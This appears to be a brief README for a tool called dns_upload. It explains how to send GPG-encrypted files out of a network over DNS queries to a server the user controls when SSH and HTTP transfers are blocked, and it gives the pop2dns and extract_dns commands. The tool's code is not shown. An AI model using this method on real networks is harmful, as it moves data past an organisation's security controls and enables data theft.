# dns_upload

In the scenario where you need to transmit data, but many controls are in place to prevent ssh or http based transfers,
but DNS is open to the internet, you can transmit data in DNS requests. It is not ideal, but it is a way.

Transmitting encrypted data over dns to a dns server you have access to with  "rndc querylog on". 

Name the file you want to send as file.txt

pop2dns $password $dnsserver

Where $password is the password used by gpg to encrypt
and $dnsserver is your dns server.

Once back on your dns server, you will have to extract the segment in question from the logs into a file named examine.txt
then.

extract_dns

Then you will have file.txt.asc which can be decrypted with gpg using the password sent in by pop2dns.
